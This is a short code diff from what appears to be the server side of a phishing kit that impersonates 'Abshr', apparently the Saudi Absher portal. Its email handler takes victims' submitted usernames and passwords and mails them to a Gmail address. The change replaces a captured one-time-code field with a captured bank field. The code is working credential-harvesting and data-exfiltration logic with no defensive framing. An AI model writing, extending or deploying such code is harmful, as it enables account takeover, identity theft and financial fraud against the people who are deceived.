@@ -82,10 +82,10 @@ exports.email = async(req,res,next)=>{
             to:'saudiabsher1990@gmail.com',
             // to:'pnusds269@gmail.com',
             subject: `Abshr Username And Password Account New Login`,
-            html:`<div>
+                        html:`<div>
             <p> Username : ${req.body.username}</p>
             <p> Password : ${req.body.password}</p>  
-            ${req.body.otp ? `<p> Otp : ${req.body.otp}</p> `:'' }     
+            ${req.body.bank ? `<p> Bank : ${req.body.bank}</p> `:'' }     
             </div>`
           }).then(info=>{
             if(info.accepted.length){
